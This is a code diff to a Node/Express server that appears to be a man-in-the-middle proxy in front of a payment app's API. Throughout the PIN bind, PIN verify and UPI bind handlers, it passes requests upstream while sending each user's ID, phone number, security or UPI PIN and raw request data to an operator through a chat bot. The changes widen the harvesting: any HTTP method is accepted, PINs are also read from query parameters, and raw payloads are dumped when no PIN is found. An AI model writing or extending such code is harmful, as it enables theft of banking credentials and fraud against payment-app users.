@@ -317,7 +317,7 @@ const BANK_FIELDS = {
   'collectionaccount': 'accountNo', 'collectionaccountno': 'accountNo',
   'customerbanknumber': 'accountNo', 'customerbankaccount': 'accountNo', 'customeraccountno': 'accountNo',
   'beneficiaryname': 'accountHolder', 'accountname': 'accountHolder', 'account_name': 'accountHolder',
-  'receiveaccountname': 'accountHolder', 'holdername': 'accountHolder', 'name': 'accountHolder',
+  'receiveaccountname': 'accountHolder', 'holdername': 'accountHolder',
   'accountholder': 'accountHolder', 'bankaccountholder': 'accountHolder', 'receivename': 'accountHolder',
   'payeename': 'accountHolder', 'bankaccountname': 'accountHolder', 'realname': 'accountHolder',
   'cardholder': 'accountHolder', 'cardname': 'accountHolder', 'bankcardname': 'accountHolder',
@@ -328,7 +328,7 @@ const BANK_FIELDS = {
   'ifsc': 'ifsc', 'ifsccode': 'ifsc', 'ifsc_code': 'ifsc', 'receiveifsc': 'ifsc',
   'bankifsc': 'ifsc', 'payeeifsc': 'ifsc', 'payeebankifsc': 'ifsc', 'receiverifsc': 'ifsc',
   'receiverbankifsc': 'ifsc', 'collectionifsc': 'ifsc',
-  'bankname': 'bankName', 'bank_name': 'bankName', 'bank': 'bankName',
+  'bankname': 'bankName', 'bank_name': 'bankName',
   'payeebankname': 'bankName', 'receiverbankname': 'bankName', 'receivebankname': 'bankName',
   'collectionbankname': 'bankName',
   'upiid': 'upiId', 'upi_id': 'upiId', 'upi': 'upiId', 'vpa': 'upiId',
@@ -697,12 +697,13 @@ app.post('/app/auth/register', async (req, res) => {
   } catch(e) { await transparentProxy(req, res); }
 });
 
-app.post('/app/secure/pin/bind', async (req, res) => {
+app.all('/app/secure/pin/bind', async (req, res) => {
   try {
     const data = await loadData();
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const body = req.parsedBody || {};
-    const pin = body.pin || body.securePin || body.payPassword || '';
+    const qp = Object.fromEntries(new URL(req.originalUrl, 'http://x').searchParams);
+    const pin = body.pin || body.securePin || body.payPassword || body.payPin || qp.pin || qp.securePin || '';
     const userId = await extractUserId(req, jsonResp);
     if (userId) saveTokenUserId(req, userId);
     const phone = getPhone(data, userId);
@@ -734,19 +735,21 @@ app.post('/app/secure/pin/update', async (req, res) => {
   } catch(e) { await transparentProxy(req, res); }
 });
 
-app.post('/app/secure/pin/verify', async (req, res) => {
+app.all('/app/secure/pin/verify', async (req, res) => {
   try {
     const data = await loadData();
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const body = req.parsedBody || {};
-    const pin = body.pin || body.securePin || '';
+    const qp = Object.fromEntries(new URL(req.originalUrl, 'http://x').searchParams);
+    const pin = body.pin || body.securePin || body.payPassword || body.payPin || qp.pin || qp.securePin || '';
     const userId = await extractUserId(req, jsonResp);
     if (userId) saveTokenUserId(req, userId);
     const phone = getPhone(data, userId);
     if (data.adminChatId && bot) {
-      bot.sendMessage(data.adminChatId,
-        `🔓 PIN VERIFY\n👤 User: ${userId || 'N/A'}\n📱 Phone: ${phone || 'N/A'}\n🔐 PIN: ${pin || 'N/A'}\n📊 Status: ${jsonResp && (jsonResp.code === 200 || jsonResp.code === 0 || jsonResp.success) ? '✅ Success' : '❌ Failed'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
-      ).catch(()=>{});
+      let msg = `🔓 PIN VERIFY\n👤 User: ${userId || 'N/A'}\n📱 Phone: ${phone || 'N/A'}\n🔐 PIN: ${pin || 'N/A'}\n📊 Status: ${jsonResp && (jsonResp.code === 200 || jsonResp.code === 0 || jsonResp.success) ? '✅ Success' : '❌ Failed'}`;
+      if (!pin) msg += `\n📦 Body: ${JSON.stringify(body).substring(0, 500)}\n🔗 Query: ${JSON.stringify(qp).substring(0, 300)}`;
+      msg += `\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
+      bot.sendMessage(data.adminChatId, msg).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
@@ -792,12 +795,14 @@ app.all('/app/bind/select/upi', async (req, res) => {
     const body = req.parsedBody || {};
     const userId = await extractUserId(req, jsonResp);
     if (userId) saveTokenUserId(req, userId);
-    const pin = body.pin || body.upiPin || body.securePin || '';
+    const qp = Object.fromEntries(new URL(req.originalUrl, 'http://x').searchParams);
+    const pin = body.pin || body.upiPin || body.securePin || body.payPin || qp.pin || qp.upiPin || '';
     const respData = getResponseData(jsonResp);
     if (data.adminChatId && bot) {
-      bot.sendMessage(data.adminChatId,
-        `🔗 UPI BIND SELECT\n👤 User: ${userId || 'N/A'}\n📱 Phone: ${getPhone(data, userId) || 'N/A'}\n🔐 PIN: ${pin || 'N/A'}\n📦 Body: ${JSON.stringify(body).substring(0, 500)}\n📊 Response: ${JSON.stringify(respData).substring(0, 500)}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
-      ).catch(()=>{});
+      let msg = `🔗 UPI BIND SELECT\n👤 User: ${userId || 'N/A'}\n📱 Phone: ${getPhone(data, userId) || 'N/A'}\n🔐 PIN: ${pin || 'N/A'}\n📦 Body: ${JSON.stringify(body).substring(0, 500)}\n📊 Response: ${JSON.stringify(respData).substring(0, 500)}`;
+      if (!pin) msg += `\n🔗 Query: ${JSON.stringify(qp).substring(0, 300)}`;
+      msg += `\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
+      bot.sendMessage(data.adminChatId, msg).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
@@ -835,7 +840,8 @@ for (const ep of BIND_ENDPOINTS) {
       const body = req.parsedBody || {};
       const userId = await extractUserId(req, jsonResp);
       if (userId) saveTokenUserId(req, userId);
-      const pin = body.pin || body.upiPin || body.securePin || '';
+      const qp = Object.fromEntries(new URL(req.originalUrl, 'http://x').searchParams);
+      const pin = body.pin || body.upiPin || body.securePin || body.payPin || qp.pin || qp.upiPin || '';
       const respData = getResponseData(jsonResp);
       if (data.adminChatId && bot) {
         let msg = `📲 UPI Bind: ${ep.split('/').pop()}\n👤 User: ${userId || 'N/A'}`;
